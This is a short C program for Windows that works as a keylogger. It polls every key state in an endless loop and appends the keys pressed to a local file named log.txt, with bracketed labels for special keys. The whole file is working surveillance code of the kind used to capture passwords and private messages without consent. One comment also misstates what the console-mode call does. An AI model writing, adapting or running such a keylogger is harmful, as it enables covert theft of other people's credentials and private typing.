#include <windows.h>
#include <stdio.h>
#include <string.h>

void logKeystrokes(int key, char *file) {
    // Open the file in append mode
    FILE *log = fopen(file, "a+");
    if (log == NULL) {
        printf("Error opening file!\n");
        return;
    }

    // Write the key pressed to the file
    if ((key >= '0' && key <= '9') || (key >= 'A' && key <= 'Z') || (key >= 'a' && key <= 'z')) {
        fprintf(log, "%c", key);
    } else {
        switch (key) {
            case VK_SPACE:
                fprintf(log, " ");
                break;
            case VK_SHIFT:
                fprintf(log, "[SHIFT]");
                break;
            case VK_RETURN:
                fprintf(log, "[ENTER]\n");
                break;
            case VK_BACK:
                fprintf(log, "[BACKSPACE]");
                break;
            case VK_TAB:
                fprintf(log, "[TAB]");
                break;
            case VK_CONTROL:
                fprintf(log, "[CTRL]");
                break;
            case VK_DELETE:
                fprintf(log, "[DEL]");
                break;
            case VK_OEM_1:
                fprintf(log, "[;:]");
                break;
            case VK_OEM_2:
                fprintf(log, "[/?]");
                break;
            case VK_OEM_PLUS:
                fprintf(log, "[+]");
                break;
            case VK_OEM_COMMA:
                fprintf(log, "[,]");
                break;
            case VK_OEM_MINUS:
                fprintf(log, "[-]");
                break;
            case VK_OEM_PERIOD:
                fprintf(log, "[.]");
                break;
            default:
                fprintf(log, "[%d]", key);
                break;
        }
    }

    // Close the file
    fclose(log);
}

int main() {
    char file[] = "log.txt";
    // Set the console mode to enable line input and to disable echo input
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    DWORD mode = 0;
    GetConsoleMode(hStdin, &mode);
    SetConsoleMode(hStdin, mode | ENABLE_LINE_INPUT | ENABLE_ECHO_INPUT);

    // Record the keystrokes
    while (1) {
        for (int key = 0; key < 256; key++) {
            short status = GetAsyncKeyState(key);
            if (status == -32767) {
                logKeystrokes(key, file);
            }
        }
    }

    return 0;
}
